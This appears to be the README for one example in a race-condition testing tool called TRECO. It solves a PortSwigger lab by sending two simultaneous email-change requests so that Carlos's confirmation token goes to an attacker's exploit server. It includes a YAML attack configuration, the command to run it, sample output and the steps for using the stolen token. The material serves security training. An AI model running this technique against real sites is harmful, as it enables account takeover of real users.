# PortSwigger Lab 4: Single-Endpoint Race Conditions

**Lab URL:** https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint

## Lab Description

This lab's email change functionality contains a race condition that makes it vulnerable to account takeover. To solve the lab, exploit this race condition to take over Carlos's account.

## Vulnerability

The email change endpoint sends a confirmation token to the new email address, but there's a race condition in how it processes multiple simultaneous requests. By racing two email change requests (one with your email, one with Carlos's email), you can cause the system to:
1. Accept your email address for the account
2. Send Carlos's confirmation token to YOUR email address

## Solution with TRECO

This example demonstrates:
- **State-level input override** - Different emails used in the race state
- **DISTRIBUTE mode with 2 threads** - Precise control over which value each thread sends
- **Multi-stage attack** - Login first, then race

### Key Features Used

1. **State-Level Input Override** - Race state defines its own emails
2. **Distribution Mode: distribute** - Thread 0 gets attacker email, Thread 1 gets carlos email
3. **Multi-State Flow** - Login → Race → Instructions
4. **Exactly 2 Threads** - Precise control needed for this attack

### Configuration

```yaml
states:
  login_wiener:
    request: "POST /login ..."
    next:
      - goto: race_email_change

  race_email_change:
    # State-level input override
    input:
      emails:
        - "attacker@{{ exploit_server }}"
        - "carlos@{{ target.host }}"
    
    race:
      threads: 2  # Exactly 2 threads
      input_mode: distribute  # Thread 0: attacker, Thread 1: carlos
```

### Usage

1. **Get your lab URL and exploit server** from PortSwigger Academy
2. **Set the environment variables:**
   ```bash
   export LAB_HOST="YOUR-LAB-ID.web-security-academy.net"
   export EXPLOIT_SERVER="YOUR-EXPLOIT-SERVER.exploit-server.net"
   ```

3. **Run the attack:**
   ```bash
   treco examples/portswigger/single-endpoint-race/attack.yaml
   ```

4. **Complete the lab manually:**
   - Check your exploit server's access log
   - Find the token from Carlos's confirmation request
   - Visit the confirmation URL with that token
   - Lab solved!

### Expected Output

```
╔══════════════════════════════════════════════════════════════════════════════╗
║  🔐 PortSwigger Lab 4: Single-Endpoint Race Conditions                       ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Target:         YOUR-LAB-ID.web-security-academy.net                        ║
║  Exploit Server: YOUR-EXPLOIT-SERVER.exploit-server.net                      ║
║  Strategy:       Race 2 email changes with different emails simultaneously   ║
║  Mode:           DISTRIBUTE (Thread 0: attacker, Thread 1: carlos)           ║
╚══════════════════════════════════════════════════════════════════════════════╝

🔑 Step 1: Logging in as wiener...
✅ Logged in as wiener
🍪 Session: s%3A...

⚡ Step 2: Racing email change requests...

Thread 0 will send: email=attacker@YOUR-EXPLOIT-SERVER.exploit-server.net
Thread 1 will send: email=carlos@YOUR-LAB-ID.web-security-academy.net

🟢 Thread 0: Email change to "attacker@..." - Status 302
🟢 Thread 1: Email change to "carlos@..." - Status 302

╔══════════════════════════════════════════════════════════════════════════════╗
║  📋 MANUAL STEPS TO COMPLETE THE LAB                                         ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  1. Go to your exploit server and check the access log                       ║
║  2. Look for a GET request containing a token parameter                      ║
║  3. Copy the token value                                                     ║
║  4. Visit: https://LAB-HOST/my-account/change-email?token=XXXXX              ║
║  5. Lab should be marked as solved!                                          ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

### How It Works

1. **Login as wiener:** Get a valid session token
2. **State-level override:** Race state defines two different emails
3. **Distribute mode:** Thread 0 gets attacker email, Thread 1 gets carlos email
4. **Race condition:** Both threads send email change requests simultaneously
5. **Vulnerability exploited:** Due to race condition:
   - One request starts processing first
   - Second request overlaps during processing
   - System gets confused about which email to confirm
   - Carlos's confirmation token gets sent to YOUR exploit server
6. **Manual completion:** Use the stolen token to confirm the email change

### Attack Flow Diagram

```
┌─────────────────┐
│ Login as wiener │
│  (get session)  │
└────────┬────────┘
         │
         v
┌─────────────────────────────────────┐
│    Race Email Change (2 threads)    │
├─────────────────────────────────────┤
│ Thread 0: attacker@exploit-server   │
│ Thread 1: carlos@target             │
└────────┬────────────────────────────┘
         │
         v
┌─────────────────────────────────────┐
│  Race Condition Exploited           │
├─────────────────────────────────────┤
│  Token for carlos sent to exploit   │
│  server instead of carlos           │
└────────┬────────────────────────────┘
         │
         v
┌─────────────────────────────────────┐
│  Use token to confirm email         │
│  Take over Carlos's account         │
└─────────────────────────────────────┘
```

### Customization

**Change emails:**
```yaml
input:
  emails:
    - "your-email@your-domain.com"
    - "carlos@{{ target.host }}"
```

**Adjust timing:**
```yaml
race:
  sync_mechanism: countdown_latch  # Try different sync
  connection_strategy: multiplexed  # Try HTTP/2
```

## Technical Details

- **Threads:** 2 (exactly two requests needed for this race)
- **Sync Mechanism:** barrier (ensures both start exactly together)
- **Connection Strategy:** preconnect (pre-establish connections)
- **Input Mode:** distribute (Thread 0 gets first email, Thread 1 gets second)
- **State-Level Override:** Race state defines its own input, separate from entrypoint

## Why This Works

The race condition occurs because:
1. Email change processes both requests
2. Both requests pass initial validation
3. System generates confirmation token for both
4. Race condition causes token for carlos's email to be sent to wrong address
5. You receive the token meant for carlos
6. You can use it to confirm carlos's email change

## See Also

- [TRECO Documentation](../../../README.md)
- [Input Sources Guide](../../../INPUT_SOURCES.md)
- [State-Level Input Override](../../../INPUT_SOURCES.md#state-level-input)
- [PortSwigger Lab 2: Rate Limit Bypass](../rate-limit-bypass/)
